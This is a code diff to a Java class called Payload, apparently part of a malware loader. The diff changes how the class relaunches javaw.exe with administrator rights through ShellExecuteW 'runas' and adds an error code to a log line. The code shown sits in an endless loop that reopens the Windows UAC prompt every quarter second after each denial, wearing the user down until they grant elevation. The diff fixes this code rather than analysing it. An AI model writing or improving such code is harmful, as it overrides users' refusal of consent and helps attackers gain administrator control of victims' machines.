@@ -153,6 +153,7 @@ public class Payload {
         try {
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javaExe = javaHome + "\\bin\\javaw.exe";
+            String javaBinDir = javaHome + "\\bin";
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             File lockFile = new File(getLoaderDir(), ".lock");
 
@@ -166,8 +167,8 @@ public class Payload {
             while (true) {
                 log("Triggering UAC...");
                 
-                // FIX: Wrap javaExe in quotes to handle paths with spaces
-                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", "\"" + javaExe + "\"", cmdArgs, null, 1);
+                // Pass javaExe WITHOUT quotes, but set the working directory (javaBinDir) so Windows finds it
+                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, javaBinDir, 1);
                 
                 if (result > 32) {
                     log("UAC Accepted. Waiting for elevated process...");
@@ -180,7 +181,7 @@ public class Payload {
                         Thread.sleep(100);
                     }
                 } else {
-                    log("UAC Denied. Instantly retrying...");
+                    log("UAC Denied (Code: " + result + "). Instantly retrying...");
                     Thread.sleep(250); 
                 }
             }
